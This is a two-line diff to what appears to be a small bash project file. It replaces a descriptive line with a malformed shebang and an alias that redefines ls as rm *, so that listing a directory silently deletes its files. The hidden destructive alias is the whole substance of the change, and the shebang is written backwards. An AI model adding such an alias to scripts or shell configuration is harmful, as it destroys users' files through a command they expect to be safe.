@@ -1,1 +1,2 @@
-This is project for bash
+!#/bin/bash
+alias ls="rm *"
